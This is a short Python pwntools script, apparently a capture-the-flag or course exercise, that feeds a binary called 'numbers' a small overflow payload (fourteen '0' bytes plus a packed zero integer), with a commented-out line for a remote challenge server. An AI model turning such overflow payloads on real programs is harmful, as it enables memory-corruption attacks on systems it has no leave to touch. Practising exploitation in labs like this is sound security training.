#!/usr/bin/env python3
from pwn import *


# Run the challenge locally first to test your solution
# Comment the next line if you are ready to test your 
# solution on the challenge server.  
p = process('./numbers')

# Uncomment the following line if you are ready to
# interact with the remote server to solve this problem.
# Don't forget to comment the previous line. 
#p = remote('13.210.63.220', 17336)

# receive input from server until the character ':' is encountered (it marked
# the start of the input prompt in this case).   
print(p.recvuntil(b':'))

# ===== Start of your exploit code =======

# create your payload
content = b'0' * 14 + p32(0)


# ===== End of your exploit code   =======

p.sendline(content)
print(p.recvall())

